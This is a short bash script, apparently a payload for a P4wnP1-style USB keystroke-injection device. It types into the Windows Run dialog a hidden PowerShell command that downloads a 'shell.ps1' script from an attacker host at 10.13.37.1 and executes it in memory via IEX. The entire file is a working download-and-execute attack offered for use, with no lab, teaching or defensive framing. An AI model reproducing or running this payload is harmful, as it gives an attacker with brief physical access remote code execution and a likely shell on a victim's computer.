#!/bin/bash

### Description: Autorun payload that pulls and executes a remote PowerShell script
### Requirements: HID keyboard, hosted shell.ps1 file

LHOST="10.13.37.1"
SCRIPT="shell.ps1"

CMD="powershell -WindowStyle hidden -nop -c IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/$SCRIPT')"
ESCAPED=$(echo "$CMD" | sed 's/"/\\"/g')

/opt/p4wnp1/tools/hid_injector inject "GUI r"
sleep 1
/opt/p4wnp1/tools/hid_injector type "$ESCAPED"
/opt/p4wnp1/tools/hid_injector inject "ENTER"

echo "[+] Autorun PowerShell downloader executed."
